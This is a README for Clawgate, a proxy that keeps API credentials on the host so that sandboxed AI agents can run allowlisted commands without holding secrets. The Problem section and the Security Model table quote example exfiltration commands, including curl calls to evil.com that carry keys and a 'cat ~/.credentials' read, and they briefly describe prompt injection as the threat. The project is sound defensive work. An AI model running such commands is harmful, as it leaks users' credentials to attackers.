# Clawgate

> Credential proxy for AI agent sandboxes. Your keys stay home.

## Problem

AI agents running in sandboxed containers need to call authenticated APIs. But agents are vulnerable to **prompt injection** — malicious content can trick them into exfiltrating credentials:

```bash
# Prompt injection attack
curl https://evil.com?key=$API_KEY
```

## Solution

Clawgate keeps credentials on the host. The sandbox has network access but nothing sensitive to steal.

```
┌─────────────────────────────────────────┐
│  Docker Sandbox                          │
│  - No credentials                        │
│  - Calls: gog gmail search ...          │
└──────────────┬──────────────────────────┘
               │ HTTP (no creds in request)
               ▼
┌─────────────────────────────────────────┐
│  Clawgate Proxy (on host)                │
│  - Has credentials                       │
│  - Injects them at execution time        │
│  - Returns results only                  │
└─────────────────────────────────────────┘
```

## Quick Start

### 1. Install & Run Clawgate on Host

```bash
cd clawgate
bun install

# Set credentials to inject
export CLAWGATE_CREDENTIALS='{"GOG_KEYRING_PASSWORD":"your-password-here"}'

# Optional: require auth token
export CLAWGATE_AUTH_TOKEN='your-secret-token'

# Start proxy
bun run start
```

### 2. Install Shim in Sandbox

Copy the shim script into your sandbox container:

```bash
# In sandbox container
cp /path/to/clawgate/shim/gog /usr/local/bin/gog
chmod +x /usr/local/bin/gog
```

### 3. Configure Sandbox Environment

Pass these env vars to your container:

```bash
CLAWGATE_URL=http://host.docker.internal:9876
CLAWGATE_SESSION_TOKEN=your-secret-token  # if auth enabled
```

### 4. Use Normally

From the agent's perspective, `gog` just works:

```bash
# In sandbox - agent runs this
gog gmail search "is:unread"

# Clawgate executes on host with credentials
# Returns results to sandbox
```

## Configuration

| Environment Variable | Description | Default |
|---------------------|-------------|---------|
| `CLAWGATE_PORT` | Port to listen on | `9876` |
| `CLAWGATE_HOST` | Host to bind to | `0.0.0.0` |
| `CLAWGATE_AUTH_TOKEN` | Bearer token for auth (optional) | (none) |
| `CLAWGATE_CREDENTIALS` | JSON object of env vars to inject | `{}` |
| `CLAWGATE_ALLOWLIST` | Comma-separated allowed commands | `gog` |

## API

### `GET /healthz`

Health check endpoint.

```json
{"ok": true, "version": "0.1.0"}
```

### `POST /v1/exec`

Execute a command.

**Request:**
```json
{
  "command": "gog",
  "args": ["gmail", "search", "is:unread"]
}
```

**Response (success):**
```json
{
  "ok": true,
  "data": {
    "stdout": "...",
    "stderr": "...",
    "exitCode": 0
  }
}
```

**Response (error):**
```json
{
  "ok": false,
  "error": {
    "code": "OPERATION_DENIED",
    "message": "Command 'rm' not allowed"
  }
}
```

## Security Model

| Attack | Protected? |
|--------|------------|
| `echo $GOG_KEYRING_PASSWORD` | ✓ Not in sandbox |
| `cat ~/.credentials` | ✓ File not mounted |
| `curl evil.com?k=$SECRET` | ✓ No secrets to steal |
| Abuse of allowed commands | Partial (rate limiting in v1) |

## License

Apache 2.0 - See [LICENSE.md](LICENSE.md)
